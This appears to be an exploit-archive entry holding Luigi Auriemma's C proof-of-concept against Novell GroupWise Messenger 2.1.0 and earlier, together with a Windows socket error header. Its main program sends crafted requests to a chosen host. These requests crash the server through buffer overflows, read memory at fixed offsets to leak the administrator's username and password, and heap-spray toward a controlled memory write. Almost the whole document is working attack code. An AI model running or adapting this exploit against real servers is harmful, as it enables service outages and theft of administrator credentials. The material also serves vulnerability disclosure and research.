@@ -1,0 +1,453 @@
+id: 18885
+date: 07/01/2012
+title: Novell GroupWise Messenger <= 2.1.0 DoS
+author: Luigi Auriemma
+cves: 
+
+winerr.h
+
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+
+----------
+
+nmma_x.c
+
+----------
+
+/*
+  by Luigi Auriemma
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <stdarg.h>
+#include <time.h>
+
+#ifdef WIN32
+    #include <winsock.h>
+    #include "winerr.h"
+
+    #define close   closesocket
+    #define sleep   Sleep
+    #define ONESEC  1000
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+
+    #define ONESEC  1
+#endif
+
+typedef uint8_t     u8;
+typedef uint16_t    u16;
+typedef uint32_t    u32;
+
+
+
+#define VER         "0.1"
+#define PORT        8300
+#define BUFFSZ      8192    // the server doesn't handle more than this
+#define MAXSZ       0xff0   // the server doesn't handle more than this
+
+#define BOFCHR      0x41414141
+#define BUG2a       0x00560224
+#define BUG2b       0x00560324
+
+
+
+int tcp_recv(int sd, u8 *buff, int size);
+int recv_gwm(int sd);
+int send_gwm(int sd, u8 *cmd, ...);
+int timeout(int sock, int secs);
+u32 resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    struct  linger  ling = {1,1};
+    struct  sockaddr_in peer;
+    int     sd,
+            i,
+            bug;
+    u16     port    = PORT;
+    u8      tmp[32],
+            *host;
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Vulnerabilities in Novell GroupWise Messenger <= 2.1.0 " VER "\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    aluigi.org\n"
+        "\n", stdout);
+
+    if(argc < 3) {
+        printf("\n"
+            "Usage: %s <bug> <host> [port(%d)]\n"
+            "\n"
+            "Bugs:\n"
+            " refer to the relative advisories for the available numbers\n"
+            " and what vulnerabilities they test\n"
+            "\n", argv[0], port);
+        exit(1);
+    }
+
+    bug  = atoi(argv[1]);
+    host = argv[2];
+    if(argc > 3) port = atoi(argv[3]);
+
+    peer.sin_addr.s_addr = resolv(host);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
+
+    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if(sd < 0) std_err();
+    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
+    if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) < 0) std_err();
+
+    if(bug == 0) {
+        // lame DoS only
+        send_gwm(sd, "login",
+            "NM_A_SZ_TRANSACTION_ID",   8,  BOFCHR,
+            NULL,                       -1, NULL);
+
+    } else if(bug == 1) {
+        send_gwm(sd, "login",
+            "NM_A_PARM1",               12, BOFCHR,
+            NULL,                       -1, NULL);
+
+    } else if(bug == 2) {
+        printf("- read memory at offset 0x%08x (administrator FDN username):\n", BUG2a);
+        send_gwm(sd, "getdetails",
+            "NM_A_SZ_DN",               8,  BUG2a,
+            NULL,                       -1, NULL);
+
+        printf("- read memory at offset 0x%08x (administrator password):\n", BUG2b);
+        send_gwm(sd, "getdetails",
+            "NM_A_SZ_DN",               8,  BUG2b,
+            NULL,                       -1, NULL);
+
+    } else if(bug == 3) {
+        printf("- heap spray, you will get a write4 in 0x%08x\n", BOFCHR); 
+        for(i = 0; i < 50; i++) {
+            send_gwm(sd, "createsearch",
+                "test",                 10, NULL,   // NULL here is a string of about 4000 'a's
+                NULL,                   -1, NULL);
+
+            send_gwm(sd, "createsearch",
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                "test",                 9,  0,
+                NULL,                   -1, NULL);
+        }
+
+        printf(
+            "- now I need to join the Messenger server with a valid account.\n"
+            "  I will use the account with username \"admin\" and password\n"
+            "  \"adminpass\" so that it's not needed to create additional accounts\n"
+            "  (boring operation) for verifying this vulnerability.\n"
+            "  be sure to have this account on your eDirectory server.\n"
+            "  press RETURN to continue the test\n");
+        fgets(tmp, sizeof(tmp), stdin);
+
+        send_gwm(sd, "login",
+            //"NM_A_PARM1",               10, "Sx6ItFwErgcmyZ62tIbi3w%3d%3d", // blowfish of "test::test"
+            "NM_A_PARM1",               10, "1Bi2DNQGfH0ScFGkgDD8dVHeYP%2bt9VL7",   // blowfish of "admin::adminpass"
+            "NM_A_SZ_USER_AGENT",       10, "NGWMW%2f2%2e0%2e2+%28Windows+Server+2003%3b+5%2e2%29",
+            "NM_A_UD_BUILD",            8,  7,
+            NULL,                       -1, NULL);
+
+        send_gwm(sd, "getattribs",
+            NULL,                       -1, NULL);
+
+        send_gwm(sd, "createsearch",
+            "test",                     9,  0,
+            NULL,                       -1, NULL);
+
+    } else {
+        printf("\nError: invalid bug number (%d)\n", bug);
+        exit(1);
+    }
+
+//quit:
+    close(sd);
+    printf("\n- done\n");
+    return(0);
+}
+
+
+
+int tcp_recv(int sd, u8 *buff, int size) {
+    int     i;
+    u8      c;
+
+    for(i = 0; i < size; i++) {
+        if(recv(sd, buff ? (buff + i) : ((void *)&c), 1, 0) <= 0) return(-1);
+    }
+    return(i);
+}
+
+
+
+int recv_gwm(int sd) {
+    static u8   *buff = NULL;
+    u32     len;
+    int     crlf = 0,
+            eof  = 0;
+    u16     type;
+    u8      c;
+
+    for(;;) {
+        len = recv(sd, (void *)&c, 1, 0);
+        if(len <= 0) return(-1);
+        if(c == '\n') crlf++;
+        if(c > '\r') crlf = 0;
+        if(crlf >= 2) break;
+    }
+
+    printf("\n");
+    do {
+        if(tcp_recv(sd, (void *)&type, 2) < 0) return(-1);
+        if(type == 0x683c) {    // "<html>", yeah it's lame but this is only a PoC
+            if(tcp_recv(sd, NULL, BUFFSZ) < 0) return(-1);
+            break;
+        }
+
+        if(tcp_recv(sd, (void *)&len,  4) < 0) return(-1);
+        buff = realloc(buff, len);  // no !buff check, will be automatically skipped
+        if(tcp_recv(sd, buff,  len) < 0) return(-1);
+        if(buff) printf("  %-26s ", buff);
+        if(!buff || !strcmp(buff, "NM_A_SZ_TRANSACTION_ID")) eof = 1;
+
+        if(tcp_recv(sd, (void *)&len,  4) < 0) return(-1);
+        if((type == 10) || (type == 13)) {
+            buff = realloc(buff, len);  // no !buff check, will be automatically skipped
+            if(tcp_recv(sd, buff,  len) < 0) return(-1);
+            if(buff) printf("%s\n", buff);
+        } else {
+            printf("%d\n", len);
+        }
+    } while(!eof);
+    printf("\n");
+    return(0);
+}
+
+
+
+int send_gwm(int sd, u8 *cmd, ...) {
+    static u8   buff[BUFFSZ + 1],
+                tmp[MAXSZ + 1];
+    static int  tid = 0;
+    va_list     ap;
+    int         type,
+                len;
+    u8          *p,
+                *s1,
+                *s3;
+
+    p = buff;
+    p += sprintf(p,
+        "POST /%s HTTP/1.0\r\n"
+        "\r\n",
+        cmd);
+
+    va_start(ap, cmd);
+    for(;;) {
+        s1 = va_arg(ap, u8 *);
+        if(!s1) break;
+        type = va_arg(ap, int);
+        if((type == 10) || (type == 13)) {
+            s3 = va_arg(ap, u8 *);
+            if(!s3) {   // max string
+                memset(tmp, BOFCHR & 0xff, MAXSZ);
+                tmp[MAXSZ] = 0;
+                s3 = tmp;
+            } else if((u32)(s3) <= 0x1000) {
+                sprintf(tmp, "%d", (u32)s3);
+                s3 = tmp;
+            }
+        } else {
+            sprintf(tmp, "%d", va_arg(ap, int));
+            s3 = tmp;
+        }
+        p += sprintf(p,
+            "&tag=%s"
+            "&cmd=0"
+            "&val=%s"
+            "&type=%d",
+            s1, s3, type);
+    }
+    va_end(ap);
+
+        p += sprintf(p,
+            "&tag=%s"
+            "&cmd=0"
+            "&val=%d"
+            "&type=%d"
+            "\n",
+            "NM_A_SZ_TRANSACTION_ID", ++tid, 10);
+
+    len = p - buff;
+    if(len > BUFFSZ) {
+        printf("\nError: too much data (%d) for the send buffer (%d)\n", len, BUFFSZ);
+        exit(1);
+    }
+
+    //printf(">SEND\n%s\n", buff);
+    if(send(sd, buff, len, 0) < 0) return(-1);
+
+    if(recv_gwm(sd) < 0) return(-1);
+
+    return(0);
+}
+
+
+
+int timeout(int sock, int secs) {
+    struct  timeval tout;
+    fd_set  fd_read;
+
+    tout.tv_sec  = secs;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
+      <= 0) return(-1);
+    return(0);
+}
+
+
+
+u32 resolv(char *host) {
+    struct  hostent *hp;
+    u32     host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u32 *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+
+
+
+#  0day.today [2023-03-27]  #
